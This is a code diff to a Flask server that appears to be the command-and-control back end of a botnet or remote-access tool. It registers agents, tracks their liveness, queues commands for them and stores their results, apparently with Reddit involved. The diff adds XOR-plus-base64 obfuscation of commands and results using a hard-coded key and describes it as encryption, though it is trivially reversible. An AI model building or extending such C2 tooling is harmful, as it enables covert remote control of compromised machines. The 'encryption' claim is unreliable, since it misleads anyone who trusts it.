@@ -1,7 +1,7 @@
 from flask import Flask, request, jsonify
 from datetime import datetime
 from threading import Thread
-import time, json, praw, requests
+import time, json, praw, requests, base64
 
 from models import db, Agent, Command, ProcessedPost
 
@@ -79,7 +79,7 @@ def heartbeat():
 def result():
     data = request.get_json()
     cmd_id = data.get("command_id")
-    output = data.get("result")
+    output = data.get("result")  # encrypted by agent
 
     if not cmd_id or output is None:
         return jsonify({"error": "command_id and result required"}), 400
@@ -87,7 +87,7 @@ def result():
     command = Command.query.get(cmd_id)
     if command:
         command.status = "Completed"
-        command.result = output
+        command.result = decrypt(output)   # Store Results Decrypted
         command.completed_at = datetime.utcnow()
         db.session.commit()
 
@@ -105,7 +105,7 @@ def queue_command():
     if not agent_id or not cmd_text:
         return jsonify({"error": "agent_id and command required"}), 400
 
-    new_cmd = Command(agent_id=agent_id, command=cmd_text, status="Queued")
+    new_cmd = Command(agent_id=agent_id, command=encrypt(cmd_text), status="Queued")
     db.session.add(new_cmd)
     db.session.commit()
 
@@ -201,6 +201,15 @@ def monitor_agents():
                 a.status = "Alive" if delta < 120 else "Dead"
             db.session.commit()
         time.sleep(30)
+        
+def xor(data: str, key="secret") -> str:
+    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
+
+def encrypt(data: str, key="secret") -> str:
+    return base64.b64encode(xor(data, key).encode()).decode()
+
+def decrypt(data: str, key="secret") -> str:
+    return xor(base64.b64decode(data.encode()).decode(), key)
 
 
 
